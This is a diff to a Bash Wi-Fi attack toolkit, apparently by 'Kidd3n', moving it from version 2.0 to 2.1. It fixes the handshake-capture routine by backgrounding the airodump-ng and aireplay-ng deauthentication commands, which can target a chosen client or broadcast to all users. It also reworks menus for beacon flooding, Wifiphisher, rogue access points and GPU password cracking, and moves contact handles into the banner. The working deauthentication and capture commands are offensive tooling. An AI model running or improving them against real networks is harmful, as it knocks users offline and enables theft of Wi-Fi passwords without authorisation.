@@ -287,9 +287,9 @@ handshake_ataque() {
 	if [ "$macoption" == "Y" ] || [ "$macoption" == "y" ]; then
 		echo -ne "\n${blueColour}[?]$grayColour MAC: " && read macdes
 		echo -e "${greenColour}[*]$grayColour $macdes is deauthenticating"
-		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar"
+		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
 		airodump_filter_xtermMAC_PID=$!
-		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c $macdes $tar"
+		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c $macdes $tar" &
 		aireplay_xtermMAC_PID=$!
 		sleep 10; kill -9 $aireplay_xtermMAC_PID; wait $aireplay_xtermMAC_PID 2>/dev/null
 		tput civis; echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
@@ -300,10 +300,10 @@ handshake_ataque() {
 	elif [ "$macoption" == "n" ] || [ "$macoption" == "N" ]; then
 		echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
 		$cleancolor
-		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar"
+		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
 		airodump_filter_xterm_PID=$!
 
-		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar"
+		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &
 		aireplay_xterm_PID=$!
 		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
@@ -704,7 +704,7 @@ hackingwifi() {
 	echo -e "${yellowColour}[4]$grayColour Beacon Flood Attack"
 	echo -e "${yellowColour}[5]$grayColour Network traffic"
 	echo -e "${yellowColour}[6]$grayColour Scanner"
-	echo -e "${greenColour}[7]${grayColour} Back to menu"
+	echo -e "\n${greenColour}[7]${grayColour} Back to menu"
 	echo -e "\n$redColour[99]$grayColour Exit and restart the network card\n"
 	tput cnorm
 	echo -ne "${purpleColour}[?]${grayColour} Attack: " && read menuwi
@@ -743,7 +743,7 @@ fakeapmenu() {
 	echo -e "\n${turquoiseColour}[+]${grayColour} Fake Access Point\n"
 	echo -e "${yellowColour}[1]$grayColour Wifiphisher"
 	echo -e "${yellowColour}[2]$grayColour Fake/Rogue AP"
-	echo -e "${greenColour}[3]${grayColour} Back to menu"
+	echo -e "\n${greenColour}[3]${grayColour} Back to menu"
 	echo -e "\n$redColour[99]$grayColour Exit and restart the network card\n"
 	tput cnorm
 	echo -ne "${purpleColour}[?]${grayColour} Attack: " && read menufa
@@ -772,7 +772,7 @@ crackingpass() {
 	echo -e "${yellowColour}[2]$grayColour Hash .cap -> .hccapx"
 	echo -e "${yellowColour}[3]$grayColour Hashed Dictionary (Rainbow taibles)"
 	echo -e "${yellowColour}[4]$grayColour Force Brute with GPU"
-	echo -e "${greenColour}[5]${grayColour} Back to menu"
+	echo -e "\n${greenColour}[5]${grayColour} Back to menu"
 	echo -e "\n$redColour[99]$grayColour Exit and restart the network card\n"
 	tput cnorm
 	echo -ne "${purpleColour}[?]${grayColour} Attack: " && read menupass
@@ -803,9 +803,8 @@ crackingpass() {
 attackmain(){
 	bannerattack
 	echo -e "${yellowColour}\n[1]${grayColour} Hacking Wifi"
-	echo -e "${yellowColour}[2]${grayColour} Fake Access Point/ Phishing"
+	echo -e "${yellowColour}[2]${grayColour} Fake Access Point/Phishing"
 	echo -e "${yellowColour}[3]${grayColour} Cracking password"
-	echo -e "${yellowColour}[4]${grayColour} Contact"
 	echo -e "\n$redColour[99]$grayColour Exit and restart the network card\n"
 	tput cnorm
 	echo -ne "${purpleColour}[?]${grayColour} Attack: " && read menuma
@@ -820,9 +819,6 @@ attackmain(){
 		3)
 		crackingpass
 		;;
-		4)
-		contact
-		;;
 		99)
 		exitresart
 		;;
@@ -831,36 +827,6 @@ attackmain(){
 		;;
 		esac
 
-}
-contact(){
-	bannerattack
-	echo -e "${turquoiseColour}\n[*]${grayColour} Contact me\n"
-	echo -e "${yellowColour}[1]${grayColour} Instagram"
-	echo -e "${blueColour}[2]${grayColour} Discord"
-	echo -e "${greenColour}[3]${grayColour} Back to menu"
-	echo -e "\n$redColour[99]$grayColour Exit and restart the network card\n"
-	tput cnorm
-	echo -ne "${blueColour}[?]${grayColour} Contact: " && read menuco
-	$cleancolor
-	case $menuco in
-		1)
-		echo -e "\n\n$yellowColour[*]$grayColour https://www.instagram.com/kidd3n.sh/ \n"
-		read -p "Enter to continue"
-		;;
-		2)
-		echo -e "\n\n$blueColour[*]$grayColour Discord ID: Kidden#9079\n"
-		read -p "Enter to continue"
-		;;
-		3)
-		attackmain
-		;;
-		99)
-		exitresart
-		;;
-		*)
-		echo -e "${redColour}\n[!]$grayColour Invalid Option"; sleep 2
-		;;
-		esac
 }
 #Checks if the tool was run as root
 if [ $(id -u) -ne 0 ]; then
@@ -873,8 +839,10 @@ else
 	tput civis; clear
 	echo -e "${turquoiseColour}"
 	banner
-	echo -e "\n${greenColour}[+]${grayColour} Version 2.0"
+	echo -e "\n${greenColour}[+]${grayColour} Version 2.1"
 	echo -e "${greenColour}[+]${grayColour} Github: https://github.com/Kidd3n"
+	echo -e "${greenColour}[+]${grayColour} Discord ID: Kidden#9079"
+	echo -e "${greenColour}[+]${grayColour} Instagram: kidd3n.sh"
 	echo -ne "${greenColour}[+]$grayColour Enter to continue" && read 
 	updatepackages
 	monitormode
